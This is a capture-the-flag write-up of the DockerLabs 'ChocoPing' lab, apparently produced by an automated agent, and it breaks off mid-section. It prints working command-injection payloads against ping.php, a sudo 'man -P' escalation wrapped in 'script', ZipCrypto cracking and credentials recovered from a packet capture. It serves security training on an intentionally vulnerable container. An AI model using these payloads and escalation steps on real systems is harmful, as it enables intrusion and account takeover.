# 73 ChocoPing — DockerLabs Writeup

**Class:** a regex gate that treats an *obfuscation token* as a bypass admission ticket and then hands the same variable to an unescaped `shell_exec`, chained through a `man`-pager sudoers grant to a second user, a ZipCrypto-cracked archive, and credential recovery from a packet capture.

**Target:** `http://172.17.0.8/ping.php?ip=…` (container `chocoping_container`, image `chocoping`)
**Date:** 2026-10-01
**Outcome:** Full advertised chain solved — WAF bypass RCE as `uid=33(www-data)`, sudoers escalation to `uid=1000(balutin)`, ZipCrypto archive cracked, packet capture analysed. **No flag token exists in the image** (§6). **Every write into the target was backed out and verified absent with `stat -c`; the docroot checksum is unchanged.**

**Headline:** the filter is not a wall, it is a **turnstile that opens when you show it a costume**. And the bypass branch hides its own success behind a deliberately broken first command, so the response a careless operator reads first is always empty.

---

## 0. Lab identity

The platform catalogue entry for 73, quoted verbatim from `~/dockerlabs/catalog.txt:61`:

```
73|ChocoPing|medio|Ejecuci\u00f3n remota de comandos con WAF Bypass, cracking .zip, sudoers y an\u00e1lisis de archivo .pcap
```

The file stores non-ASCII as JSON-style `\uXXXX` escapes; the decoded reading of the description field is *"Ejecución remota de comandos con WAF Bypass, cracking .zip, sudoers y análisis de archivo .pcap"*. Difficulty `medio`.

**Correction to the task brief.** The brief described this lab as *"WAF bypass class"* and asked for a privesc tail "if there is one". The catalogue says otherwise: it advertises **four** elements — WAF bypass, `.zip` cracking, sudoers, and `.pcap` analysis. Those four map onto four distinct mechanisms, and all four are reachable. Had I stopped at "no privesc" on the strength of the brief's framing, I would have filed a false negative on three of the four advertised elements. **§0 of a lab writeup is where a paraphrase of the brief gets caught.**

### Stack, from version-bearing artefacts

| Layer | Value | Source |
|---|---|---|
| Web server | Apache/2.4.62 (Debian) | `Server:` header on `GET /` |
| PHP | 8.2.28, `mod_php`, `mpm_prefork` | `php -v`, `mods-enabled/php8.2.load` |
| Directory index | `autoindex` **enabled** | `/etc/apache2/mods-enabled/autoindex.load` |
| `disable_functions` | **empty** | `/etc/php/8.2/apache2/php.ini:323` |
| `display_errors` / `log_errors` | `Off` / `On` | `php.ini:508`, `php.ini:527` |
| Execution identity | `www-data` uid 33, shell `/usr/sbin/nologin` | `ps aux`, `/etc/passwd` |
| Second user | `balutin` uid 1000, groups `1000(balutin),100(users)` | `/etc/passwd`, `id` via RCE |
| `ping` | `/usr/bin/ping`, 90568 bytes, `cap_net_raw=ep` | `command -v`, `getcap -r /` |
| Tooling present | `script` (util-linux 2.38.1), `perl`, `unzip`, `zip` | `command -v` loop |
| Tooling absent | `ss`, `netstat`, `python3`, `socat`, `7z`, `john`, `hashcat`, `tshark` | `command -v` loop |

`disable_functions` being empty is load-bearing: it is why `shell_exec` at `ping.php:22` genuinely executes rather than silently returning `null`.

---

## 1. Surface

Re-measured, not assumed. `ss` and `netstat` are **not installed in this image**, so all three listener views come from `/proc`:

```
$ cat /proc/net/tcp            # 1 data row after the header
  00000000:0050  00000000:0000  0A   ← 0A = TCP_LISTEN, 0x0050 = 80

$ cat /proc/net/tcp6           # header only — zero rows
$ cat /proc/net/udp            # header only — zero rows
```

Exactly **one** listener, `0.0.0.0:80`. No SSH, no other TCP, no IPv6, and **no UDP socket of any kind**. That is the entire network surface, and it matches the baseline given in the brief.

**That negative is earned, not assumed.** A `/proc/net/*` listing is a claim about what the kernel has bound; it is not a statement about what is reachable. The client-side control is that the *same* curl invocation reached `:80` successfully on 65 requests (§ work count, `evidence/work_count.txt`), and `curl` reached `robots.txt` with an Apache `404` and `/` with an Apache `200` — so the client path worked. The single-row listener table is therefore a measurement, not a gap.

Docroot, read directly:

```
$ ls -la /var/www/html/
-rw-r--r-- 1 root root 1011 Apr  5  2025 ping.php      ← the only file
```

**`autoindex` is on**, so the docroot enumerates itself without a wordlist:

```
$ GET http://172.17.0.8/          → 200, 749 bytes, Apache index listing, one entry: ping.php
$ GET http://172.17.0.8/robots.txt → 404, 272 bytes (Apache default error body, no rules)
```

No `robots.txt` exists, so the `ctf-safe-enumeration` rule set has nothing to honour: no `Disallow`, no `Crawl-delay`, no `Sitemap`. That is itself a measured negative — a `404` from the origin root, distinguished from a `200` with an empty body by the 272-byte Apache error page.

Total HTTP requests issued against the target: **65**, itemised in `evidence/work_count.txt`.

---

## 2. The class

> A deny-list gate whose **escape hatch is a bypass detector**. The author anticipated command injection, decided to *permit* a specific obfuscated shape rather than block it, and then wired the permitted input into a sink with no escaping at all.

The source, `/var/www/html/ping.php`, 32 lines, read from the container (`evidence/src_ping_php.txt`):

```php
 3: $ip = $_GET['ip'];
 5: function is_bypass_command($input) {
 6:     return preg_match('/[a-zA-Z]+\\\\/', $input);
 7: }
 9: if (isset($ip)) {
10:     if (!preg_match('/[;&|`]/', $ip)) {
11:         $ping_result = shell_exec("ping -c 4 " . escapeshellarg($ip));
12:         echo "<pre>$ping_result</pre>";
13:     }
15:     else if (preg_match('/[;&|`]/', $ip) && is_bypass_command($ip)) {
17:         $ping_result = shell_exec("ping -c 4 " . escapeshellarg($ip));
18:         echo "<pre>$ping_result</pre>";
22:         $result = shell_exec($ip);
23:         echo "<pre>$result</pre>";
24:     } else {
26:         die("Comando no permitido.");
27:     }
```

Three things a generic WAF chapter does not teach:

**1. The gate is a two-condition AND, and the second condition is an admission ticket.** Line 10 rejects any of `[;&|`]`. Line 15 re-admits input that carries a metachar **and** matches `is_bypass_command`. PHP single-quoting collapses `'/[a-zA-Z]+\\\\/'` to the PCRE `[a-zA-Z]+\\`: one or more letters followed by one literal backslash. That is not a blocklist — it is an **allowlist of obfuscation shapes**. Any string containing `x\` satisfies it. The source comment at lines 20–21 states the intent outright: *"Como el comando contiene un bypass (w\h\o\a\m\i), lo permitimos"*. The author built the keyhole and posted the shape of the key in a comment.

**2. One variable, two sinks, two different escaping disciplines.** Line 17 wraps `$ip` in `escapeshellarg`; line 22 does not. The same variable is simultaneously a safely-quoted argument and a bare command string. The security property of the page is decided by which line you read, and the page prints *both* results in *both* branches.

**3. The bypass branch is camouflaged by its own first command.** This is the part that costs an operator their finding. In the bypass branch, line 17 runs `ping -c 4 'w\h\o\a\m\i;id'` — the whole payload becomes one single-quoted hostname, `ping` fails, and **its error goes to stderr, which `shell_exec` does not collect**. The response body therefore opens with an empty `<pre></pre>`. An operator who reads the first `<pre>` concludes the payload did nothing. The proof is always in the *second* block.

The decoy is independently corroborated outside the response body. The target's own error log records every one of my bypass attempts as a failed `ping`:

```
$ tail /var/log/apache2/error.log
ping: w\h\o\a\m\i;cat /tmp/r73.out: Name or service not known
ping: w\h\o\a\m\i;id: Name or service not known
```

Same request, two channels, opposite-looking stories: the HTTP body says "nothing ran", the error log says "line 17 ran and failed, and here is its exact argument". **Neither channel alone is sufficient.**

---

## 3. Attack chain

```
Internet ──:80──► Apache 2.4.62 + mod_php 8.2  DocumentRoot /var/www/html
                     │  autoindex on → docroot enumerates itself
                     ▼
        GET /ping.php?ip=<payload>                ping.php:3, :9
                     │
    ┌────────────────┴─────────────────┐
    │                                  │
 :10 no metachar                  :15 metachar AND [a-zA-Z]+\\
    │                                  │
 :11 escapeshellarg              :17 escapeshellarg  ← DECOY, always fails,
    │                             :22 shell_exec($ip)   its stderr is dropped
    ▼                                  ▼
 ping 127.0.0.1 (works)         w\h\o\a\m\i;id
 230 B, 3.09 s                   │
                            uid=33(www-data) RCE
                                 │
                    sudo -n -l → (balutin) NOPASSWD: /usr/bin/man
                                 │   man needs a TTY to run its pager
                    script -qec "sudo -u balutin man -P /tmp/run.sh ls"
                                 ▼
                    uid=1000(balutin) RCE
                                 │
                    /home/balutin/secretito.zip  (mode 644, dir 700)
                                 │   base64 → /tmp → HTTP response body
                                 ▼
                    ZipCrypto, password 'chocolate' (candidate 22574)
                                 ▼
                    traffic.pcap  (375 B)
                                 ▼
        username=root&password=secretitosecretazo!
        Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE= → root:SuperSecret123!
```

### Hop 1 — the filter is alive, and `ping` is installed

The brief warned that `ping` might be absent, which would make branch one a dead sink and change what a `200` means. Checked before relying on it:

```
$ command -v ping → /usr/bin/ping   (90568 bytes, -rwxr-xr-x)
```

And the branch demonstrably executes:

```
GET /ping.php?ip=127.0.0.1 → 200, 230 bytes, 3.09 s
  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
  … 4 packets transmitted, 4 received, 0% packet loss, time 3089ms
```

**Discriminating evidence:** the 3.09 s wall-clock time and four `icmp_seq` lines. A `200` with an empty body would not carry that. **The brief's hypothesis is falsified: branch one is a live sink, and a `200` on this page does imply work happened** — for this parameter, on this path.

### Hop 2 — negative A: metachar without the ticket is refused

```
GET /ping.php?ip=%3Bid          → 200, 21 bytes
  Comando no permitido.
```

This is the `die()` at `ping.php:26`. It is a `200`, so **status code alone proves nothing** — the discriminator is the 21-byte body carrying the refusal string. Control: the same client, one request earlier, returned 230 bytes of real `ping` output, so the page was alive and the body channel was working.

### Hop 3 — negative B: ticket without a metachar never reaches the gate

```
GET /ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci   → 200, 11 bytes
  <pre></pre>
```

This one is routinely misread, so it is worth being exact. `w\h\o\a\m\i` carries **no** metacharacter, so line 10's `!preg_match('/[;&|`]/')` is **true** and the request takes branch one. `is_bypass_command` is never evaluated — the `&&` on line 15 is not reached. So this payload is **not rejected**; it is *never asked*. It is quoted into `ping -c 4 'w\h\o\a\m\i'`, that hostname does not resolve, the error goes to stderr, and `echo "<pre></pre>"` prints the empty block.

This is why Hop 5 needs a control: **the ticket alone gets you nothing, and the metachar alone gets you nothing, and the empty `<pre></pre>` looks identical in both cases.** Between Hop 3 and Hop 5 the body is byte-for-byte the same shape (11 vs 22 bytes, both `<pre></pre>`), which is exactly the trap.

### Hop 4 — the combined payload reaches the unescaped sink

```
GET /ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%3Bid   → 200, 63 bytes
  <pre></pre><pre>www-data
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  </pre>
```

**Discriminating evidence, three independent channels:**

- the second `<pre>` contains `uid=33(www-data)`, which is not producible by any `ping` output;
- the execution identity is `www-data`, **not** `root` — the container's `docker exec` shell is root (`/etc/passwd`, `ps aux` PID 1), so had the sink run as root the body would have said `uid=0(root)`. Getting `uid=33` proves the identity came from the *web* path, not from my own harness;
- `/var/log/apache2/error.log` gained `ping: w\h\o\a\m\i;id: Name or service not known`, confirming line 17 executed and failed while line 22 succeeded.

The shell collapses `w\h\o\a\m\i` to `whoami` and then runs `id` after the `;`. That is the whole trick: the token is not a payload, it is a **no-op prefix** whose only function is to satisfy `preg_match` on line 6.

### Hop 5 — known-positive control: a nonce I can read back out of band

`id` proves a command ran. It does not prove *my* command ran in *this* session, on *this* request. So a marker:

```
GET …ip=w\h\o\a\m\i;touch /tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a   → 200, 31 bytes
$ docker exec … stat -c '%n %s bytes mode=%a uid=%u' /tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a
  /tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a 0 bytes mode=644 uid=33     ← OOB, created
GET …ip=w\h\o\a\m\i;cat /tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a     → 200, 56 bytes
  <pre></pre><pre>www-data
  CHOCOPING73-4bccb96faa6a
  </pre>                                                                     ← nonce in the body
```

The nonce `CHOCOPING73-4bccb96faa6a` exists nowhere in the target or in `ping.php`. It appears in the HTTP response body, and `stat -c` confirms the file's owner is `uid=33`. Write and read-back both proven, in band and out of band. **First attempt at this control failed and is written up as I1 — the nonce was silently empty.**

### Hop 6 — metacharacter sweep, one variable at a time

Backslash pattern held constant at `w\h\o\a\m\i`; only the metacharacter varied (`evidence/sweep.txt`):

| Payload | Bytes | Body | What actually happened |
|---|---|---|---|
| `w\h\o\a\m\i;id` | 63 | `www-data` + `uid=33…` | `whoami` then `id` — separated |
| `w\h\o\a\m\i\|id` | 60 | `uid=33…` only | `whoami \| id` — **piped**, so `whoami`'s output became `id`'s stdin and vanished |
| `w\h\o\a\m\i&id` | 63 | `www-data` + `uid=33…` | `whoami & id` — backgrounded, both outputs |
| `w\h\o\a\m\i\`id\`` | 22 | `<pre></pre><pre></pre>` | **empty** — see below |
| `whoami;id` | 21 | `Comando no permitido.` | no backslash → no ticket → refused |

The `|` row is a free confirmation of the shell-collapse claim: `www-data` disappears **only** when the token's output is piped somewhere, which is only possible if the token really did become the command `whoami`.

The backtick row is the interesting one and it is initially a **false negative**. Empty body, no execution evidence. Per discipline I refused to trust it and built a control (`evidence/control.txt`):

```
GET …ip=w\h\o\a\m\i`id`                 → 200, 22 bytes, <pre></pre><pre></pre>   (repeat, identical)
GET …ip=w\h\o\a\m\i`touch /tmp/bt-marker-73` → 200, 31 bytes, www-data
$ stat -c '%n %s bytes uid=%u' /tmp/bt-marker-73
  /tmp/bt-marker-73 0 bytes uid=33                                            ← IT RAN
```

So the backtick form **does** execute; only its output is invisible. The reason is the token's own position: backticks perform *substitution*, not *separation*, so the shell concatenates. `whoami` + output-of-`id` (`uid=33(www-data)…`) forms a single nonsense command name → *command not found* on stderr → empty stdout. Where the backtick's inner command produces **no** stdout (`touch`), the concatenation collapses back to exactly `whoami` and prints normally. Both observations are explained by one rule, and the marker file settles it.

**This is the writeup's sharpest lesson.** `w\h\o\a\m\i\`id\`` returns an empty body that is indistinguishable from the refusal at `ping.php:26`. Had I filed on the body, I would have reported "backticks are filtered" — a claim about the filter's coverage that is false, backed by a real response.

### Hop 7 — the sudoers grant

Measured **as `www-data` through the sink**, not as root. This matters: every piece of recon I ran via `docker exec` was root, and a root-run privesc survey would have answered a question nobody asked.

```
$ sudo -n -l    (as www-data, via RCE)
User www-data may run the following commands on 0f38876b0aa7:
    (balutin) NOPASSWD: /usr/bin/man
```

One rule, and it is **binary-specific**. Proven by three same-shape probes, not assumed:

```
sudo -u balutin /usr/bin/man --version   → rc=0, "man 2.11.2"
sudo -u balutin /usr/bin/id              → rc=1, "sudo: a password is required"
sudo -u balutin /usr/bin/env             → rc=1, "sudo: a password is required"
```

### Hop 8 — code execution as `balutin`: `man` will not page without a TTY

The classic `man` escalation is `MANPAGER`/`-P`. Both were measured, both dead ends — and one of them nearly became a false finding (I2, I3):

```
sudo -u balutin MANPAGER="…" /usr/bin/man ls   → rc=1
  sudo: sorry, you are not allowed to set the following environment variables: MANPAGER
$ ls -la /tmp/bal.txt → No such file or directory          ← OOB control, marker absent
```

`MANPAGER` is rejected outright because `sudoers` grants no `SETENV` and `env_reset` applies. And `-P`, which is plain `argv` and therefore *not* stripped by `sudo`, does nothing without a terminal:

```
sudo -u balutin /usr/bin/man -P /tmp/p.sh ls → rc=0, man page printed, /tmp/pwned.txt absent
```

**Root cause:** `man-db` only invokes a pager when `stdout` is a tty. Through `shell_exec` stdout is always a pipe, so `-P` is accepted, recorded, and never used. `/usr/bin/man` 2.11.2 also honours no shell escape — a crafted page containing `'e id` rendered as **literal text** `"e id` in the output, with no execution (a controlled negative, `evidence/privesc_writable.txt`).

The missing ingredient is a pty, and the image ships one: `script` from util-linux 2.38.1.

```
$ printf '#!/bin/sh\nid > /tmp/pwned.txt\n' > /tmp/p.sh && chmod 755 /tmp/p.sh
$ script -qec "sudo -u balutin /usr/bin/man -P /tmp/p.sh ls" /dev/null
$ cat /tmp/pwned.txt
  uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)      ← OOB proof
```

`sudoers` allows `/usr/bin/man` with **any argv**, and `-P` is argv. Wrapping the call in `script` supplies the tty that `man-db` requires, so `man` dutifully runs `/tmp/p.sh` as `balutin`. Note the HTTP response body for this request was **effectively empty** — the escalation is visible only in the marker file. A repeatable helper was then built around it, with the execution identity echoed explicitly (`EUID=1000 USER=balutin`) so that no run's identity had to be inferred.

### Hop 9 — the archive

`/home/balutin/` is `drwx------ balutin`, and `/home/balutin/secretito.zip` is unreadable to `www-data` (measured: `Permission denied`). As `balutin`:

```
$ unzip -l secretito.zip        →  traffic.pcap, 375 bytes, "file security status: encrypted"
```

Copied to `/tmp` with mode 644 and exfiltrated as base64 through the RCE response body (`evidence/zip_b64_raw.txt`), then analysed on the host. Cipher identification before any cracking:

```
flag_bits = 0x0009   → bit0 encrypted, bit3 data descriptor, bit6 (AES) CLEAR
compress_type = 8 (deflate), compressed 293 → uncompressed 375, CRC32 0x04a65ee4
```

No strong-encryption bit means **legacy ZipCrypto**, which is crackable. No cracking tool was installed, so one was written (`evidence/zipcrypto_crack.py`) and — this is the part that matters — **validated against a known-answer control before being allowed to produce a negative** (I4, I5).

### Hop 10 — cracking, with the instrument under test

```
wordlist: sorted-passwords.txt (101,074 candidates)
CRACKED after 22,574 candidates → 'chocolate'
traffic.pcap  375 bytes  sha256 e98d75f0ea4ee7a5b3a980bf4f6ea440706d91d8f1641615411550bd97a4ce8c
```

Candidates were accepted on a full inflate plus CRC32 comparison against `0x04a65ee4`, not on `unzip`'s exit status — a wrong password makes `unzip` print `incorrect password`, which is also what it prints for a right password against the wrong file.

### Hop 11 — packet capture analysis

375 bytes, `pcap capture file, microsecond ts (little-endian) - version 2.4 (Raw IPv4)`. Two packets, both plaintext HTTP, no `tshark` needed:

```
POST /login HTTP/1.1
Host: ejemplo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=root&password=secretitosecretazo!

GET /private HTTP/1.1
Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=
Host: ejemplo.com
```

Two credential pairs, one cleartext in a form body and one base64 in a header. Base64 is encoding, not encryption:

```
$ echo cm9vdDpTdXBlclNlY3JldDEyMyE= | base64 -d
root:SuperSecret123!
```

Both credentials were then tested against the only authentication consumer that exists here, `su`, and **both failed** (`su: Authentication failure`, each with a 10 s `timeout`). The capture's host is `ejemplo.com`, which does not resolve to anything in this container. So these credentials are the *narrative payload* of the lab — evidence that a plaintext credential crossed the wire — and not a usable local login. Recorded as a negative with its control in `evidence/privesc_success.txt`.

---

## 4. Findings

### Reachability

**R1 — Unauthenticated remote command execution as `www-data`.** A single GET parameter on a single unauthenticated page reaches an unescaped `shell_exec`. No session, no token, no parameter other than `ip` is consulted. Confirmed by marker write with OOB `stat -c` (uid 33) and by nonce read-back into the response body.

**R2 — The docroot enumerates itself.** `autoindex` enabled; `GET /` lists `ping.php` with size and mtime. No wordlist was used at any point in this engagement.

**R3 — The bypass branch executes attacker input twice, once deliberately broken.** Line 17 and line 22 both receive `$ip`; the first is `escapeshellarg`'d and guaranteed to fail, the second is not escaped at all.

### Disclosed

**D1 — Server and interpreter versions.** `Apache/2.4.62 (Debian)` in the `Server:` header; PHP 8.2.28 via `php -v`; `disable_functions` empty at `php.ini:323`. The empty `disable_functions` is what makes R1 a real execution sink rather than a `null`-returning no-op.

**D2 — Directory structure and one non-root account.** Docroot listing plus `/etc/passwd`, which discloses `balutin` uid 1000 — the account the sudoers rule names. The privesc target was therefore identifiable from the RCE without any further guessing.

### Decisive

**D1 — Unescaped `shell_exec` at `ping.php:22`, reachable via the admission ticket at `ping.php:6`.** The mechanism is derived, not asserted: PHP single-quoting turns `'/[a-zA-Z]+\\\\/'` into the PCRE `[a-zA-Z]+\\`, which matches any letters-followed-by-backslash; the shell then collapses `w\h\o\a\m\i` to `whoami`. Confirmed by control B (ticket, no metachar → never reaches the gate), control A (metachar, no ticket → `die()`), and the conjunction (both → `uid=33` in the body).

**D2 — `sudoers` grants `(balutin) NOPASSWD: /usr/bin/man` to `www-data`, and `man-db` 2.11.2's pager is attacker-controlled when a tty is available.** The escalation is not the usual `MANPAGER` env route — that is measurably closed (`sudo` refuses `SETENV`, no `SETENV` in the rule, OOB marker absent). It is the `argv`-based `-P` route plus a pty from `script`. Proof is the marker file owned by uid 1000.

**D3 — A credential-encrypted archive and a plaintext-credential capture.** `secretito.zip` protects `traffic.pcap` with ZipCrypto (cracked, `chocolate`), and the capture carries `root:secretitosecretazo!` in a form body plus `root:SuperSecret123!` in a `Basic` header. The lab teaches the *pairing*: a weak archive cipher guarding a capture whose whole lesson is that these two secrets should never have been transmitted in the clear.

---

## 5. Instrument failures

Every entry is a place where **my own instrument** lied, counted wrong, or handed me a clean negative it had not earned.

### I1 — My positive control ran with an empty nonce, and I nearly filed "writes are not permitted"

**Defect.** The marker request was built by a heredoc-generated script in which `\$NONCE` was escaped such that the variable was never expanded at script runtime. The payload that actually reached the target was `w\h\o\a\m\i;touch /tmp/opencode-marker-73-` — with an **empty** nonce suffix.

**What it looked like.** `HTTP=200 BYTES=31`, body `<pre></pre><pre>www-data`, followed by out-of-band `stat: cannot statx '/tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a': No such file or directory`. That is the exact shape of a **target-side write refusal**: command ran, file not created, marker absent.

**What it would have caused me to file.** "The sink executes, but filesystem writes to `/tmp` are not permitted from the web identity" — a fabricated finding, complete with a genuine-looking `200` and a genuine-looking `stat` failure. It would also have destroyed the control's purpose, since the nonce is what distinguishes *my* write from anyone else's.

**Class.** A control whose distinguishing variable was silently empty. The instrument reported a plausible negative because the *instrument itself* was misconfigured; nothing in the output distinguishes "target refused" from "I never sent the thing I thought I sent".

**Fix applied.** Dumped the URL-encoded payload and byte-compared it against the intended nonce **before** trusting the result (`RAW_PARAM` and `ENCODED_URL` are recorded per-request in `evidence/ladder.txt`, `evidence/sweep.txt`, `evidence/marker_ladder.txt` for exactly this reason). Re-ran with the nonce baked in; `stat -c` then returned `0 bytes mode=644 uid=33`.

### I2 — A `2>&1 | grep` pipeline swallowed the error and I attributed the emptiness to the wrong cause

**Defect.** To test whether `sudo` passes `MANPAGER`, I ran `sudo -u balutin env 2>&1 | grep -iE "^(MANPAGER|PAGER|DISPLAY)="` and read `rc=1` as "those variables are absent, therefore `env_reset` strips them".

**Truth.** `sudo` never ran `env` at all. `/usr/bin/env` is not in the allowlist, so sudo emitted `sudo: a password is required` on stderr — and because stderr was piped into `grep`, the message was **discarded by the very filter meant to search for it**. `grep` then returned 1 because it found nothing, which I read as a statement about the environment.

**What it would have caused me to file.** "The pager route fails because `sudo`'s `env_reset` strips `MANPAGER`." The grant is real and the conclusion is wrong: the route fails because sudoers grants **no `SETENV`** and `env` itself is not permitted. A reader reproducing this would chase `env_keep`/`env_delete` in `sudoers` and find nothing there.

**Class.** A pipeline used as a detector, where the detector's own failure path is routed into the detector's input. The instrument cannot distinguish "the thing I searched for is absent" from "the search never ran", and `rc` belonged to the wrong process.

**Fix applied.** Re-ran the three probes with output redirected to a file and the exit code captured **per command**, so the allowlist question is answered by `man`→0 / `id`→1 / `env`→1 with the actual error text preserved. The `MANPAGER` question was then settled by the decisive test — `sudo` refusing to set it by name — plus an OOB marker check.

### I3 — Shell redirect precedence silently truncated my own command output

**Defect.** My helper ran `sink 'id; id -u; hostname'`, which expanded to `whoami;id; id -u; hostname > /tmp/r73.out 2>&1`. In shell, a redirect binds **only to the last command of a list**. `whoami`, `id`, and `id -u` wrote to the response body while only `hostname` was captured to the file — and the subsequent `cat` returned a single line.

**What it looked like.** `<pre>www-data` then `0f38876b0aa7`, with `uid=33(www-data) gid=33(www-data)` and `33` apparently **missing**. That is the shape of a partial execution.

**What it would have caused me to file.** A wrong account of the execution identity — plausibly "the `id` builtin is filtered or the output is truncated by the page", which would have sent me looking for a nonexistent `disable_functions` entry instead of reading the correct `php.ini:323`.

**Class.** Shell error-propagation blindness, self-inflicted. Nothing in an HTTP response distinguishes "this command produced no output" from "this command was never redirected where I thought".

**Fix applied.** Every command is now wrapped as `sh -c '<command> > /tmp/r73.out 2>&1'`, so the redirect governs the whole list, and the identity is asserted explicitly (`EUID=… USER=…`) instead of being inferred from output that might have been truncated.

### I4 — My ZipCrypto cracker reported "no match" while being broken, and I nearly recorded that as a fact about the archive

**Defect.** The cracker returned `no match after 123 candidates` against 123 themed passwords. It was wrong. Three separate defects, found only because I tested it against an archive whose password I already knew:

1. I handed the **12-byte PKWARE encryption header** to `zlib.decompress`. That header must be decrypted (to advance the key schedule) but is not part of the compressed stream.
2. I masked the stream byte to 16 bits: `(k2 | 2) & 0xFFFF`. CPython's `zipfile._ZipDecrypter` uses `k = key2 | 2` with **no mask**, and a table-driven CRC primitive rather than `zlib.crc32` — the two are not interchangeable, because XOR with `0xFFFFFFFF` changes the table index.
3. The negative printed a confident, well-formatted `no match after 123 candidates`, indistinguishable in tone from a correct result.

**What it would have caused me to file.** "The archive is not protected by a weak dictionary password, or the password is outside any reasonable wordlist" — a **negative about the target**, produced entirely by a broken instrument, resting on a tool I had written minutes earlier and never validated. It is the purest form of the failure this corpus exists to document: the instrument had no failure mode visible to me, so its silence read as evidence.

**Class.** Unvalidated instrument. A negative from a detector that has never produced a positive is not a negative; it is an absence of testing.

**Fix applied.** The cracker now faces a **known-answer control** — an archive I create locally with a password I choose — and must both crack it and produce byte-identical output before it is allowed to report anything about the target. It is validated in both directions: positive control (`CRACKED after 2 candidates: 'ctlpass'`, output `sha256` matching the original file) and negative control (wrong-password list correctly returns no match, exit 1). Only then was it run against `secretito.zip`.

### I5 — A "speed optimisation" I added manufactured a false negative against a known-good password

**Defect.** After fixing the cipher, I added a prefilter: decrypt only the 12-byte header and require the last byte to equal the CRC's high byte, rejecting 255 of every 256 candidates before the expensive inflate. Re-running the **known-answer control** then produced `no match after 2 candidates (0 passed prefilter)` — the correct password was rejected by my own filter.

**What it would have caused me to file.** Had I not re-run the control, a wrong hypothesis about the check-byte convention (Info-ZIP sets it from the DOS timestamp, not the CRC) would have silently discarded the true password and every other candidate too. The output would still have read `no match after 101074 candidates`, looking like an exhaustive, rigorous, thoroughly fruitless search.

**Class.** An optimisation that changes the *result* rather than the cost, with no test capable of distinguishing "nothing left to try" from "my filter excludes the answer". Prefilters must be provably lossless.

**Fix applied.** Prefilter **disabled**, with the reason recorded in the source next to the code: correctness over speed. Throughput without it (~5.5k candidates/s) made the full 101,074-candidate sweep a 12.8-second job, so the optimisation was never worth the risk.

### I6 — My helper's `printf %q` emitted bash-only quoting that dash cannot parse

**Defect.** To build the command string safely I used `printf %q`, which produces `$'line1\nline2'`. The container's `/bin/sh` is **dash**, which does not understand `$'…'`. Multi-line commands were mangled into literal text.

**What it would have caused me to file.** `sh: 1: %s\n: not found` and `script: unrecognized option '--- cmd.txt content ---ncat'` — an interpreter error that reads like my payload was malformed, i.e. like the privesc technique itself was failing. I was one step from abandoning a working escalation because my own quoting layer was broken.

**Class.** Using a shell-specific quoting form across a shell boundary. The escaping was valid where it was generated and invalid where it was consumed.

**Fix applied.** The command now reaches the URL builder through the **environment**, so no local quoting layer touches it. The target's own error log preserved the mangled form, which is how I confirmed the diagnosis rather than guessing at it.

### I7 — Sticky `/tmp` let a stale artifact masquerade as a fresh result

**Defect.** My helper wrote results to `/tmp/bal.out` and began each run with `rm -f /tmp/bal.out` as `www-data`. Once `balutin` created that file, sticky-bit `/tmp` (`1777`) denied `www-data` the right to unlink it: `rm: cannot remove '/tmp/bal.out': Operation not permitted`. One run then returned output inconsistent with every other run — it displayed **www-data's** `sudo -l` rules during a sequence whose other runs were executing as `balutin`.

**Why it matters more than a stale file.** The instrument had no way to tell me the file was old. A cross-identity artifact directory in a world-writable sticky directory is a place where "the last thing written here" and "the result of the command I just ran" come apart, and the divergence is silent.

**Fix applied.** Each run writes to a **fresh path** (`bal2.out`, `bal3.out`, `bal4.out`, …) so an unwritable stale file cannot be read back as current, and every command echoes `EUID=… USER=…` as its first action so the identity is asserted by the run itself rather than inferred from context. The inconsistent run was treated as untrusted and excluded from the evidence chain rather than explained away.

### I8 — An unsatisfied `su` prompt hung for 120 s and left ten processes running in the target

**Defect.** A nested-quoting failure turned my password argument into an empty string, so `script` fed nothing to `su`'s prompt. `su` blocked, my 120 s tool timeout fired, and the process tree survived: two `sh`, two `script`, two `sudo`, `man`, and a root-owned `su` holding a pty.

**What it would have caused me to leave behind.** Nine stray processes in a lab I was supposed to restore, including a root-owned `su` — invisible to any check that inspects only files. A reviewer comparing process lists before and after would find residue.

**Class.** An interactive prompt reached through a non-interactive pipe, with no timeout and no cleanup path. Also a reminder that "restore" covers process state, not just filesystem state.

**Fix applied.** Enumerated with `ps aux`, killed the tree by PID, and confirmed the pattern returned nothing. Subsequent `su` probes all carry `timeout 10`. Final state re-verified: `/proc/net/tcp` unchanged, docroot checksum unchanged.

### I9 — The status code was useless as a discriminator, and the target's own body was the decoy

**Defect.** Not a bug in my code but the single most important property of the instrument I was reading. **Every** request in this engagement returned `HTTP 200` — the clean `ping` baseline, both refusals, the successful RCE, and the empty-body backtick variant. And the bypass branch *begins* every response with an empty `<pre></pre>`, because line 17's `ping` fails with its error on an uncollected stderr.

**What it would have caused me to file.** Two errors, in opposite directions. Reading only the first `<pre>`: "the bypass did not execute" — a false negative on the lab's primary finding. Reading the empty backtick body: "backticks are filtered" — a false claim about filter coverage, with a real response body as its evidence.

**Class.** A success channel shadowed by a failure channel. `shell_exec` collects stdout only, so a failing first command contributes an empty success-looking block to every response, and the HTTP layer adds a `200` on top regardless.

**Fix applied.** Every conclusion in §3 rests on at least one of: a nonce I chose appearing in the body; a file whose existence and owner are confirmed out of band with `stat -c`; the target's `/var/log/apache2/error.log`, which independently witnesses line 17 failing; or a byte-count difference between request shapes. No claim in this writeup rests on a status code.

### I10 — My work count was reconstructed after the fact

**Defect.** The 65-request figure in §1 was **not** counted live. It was derived by grepping the archived evidence files for request markers and adding per-helper multipliers, then adding three miscellaneous enumeration requests by hand.

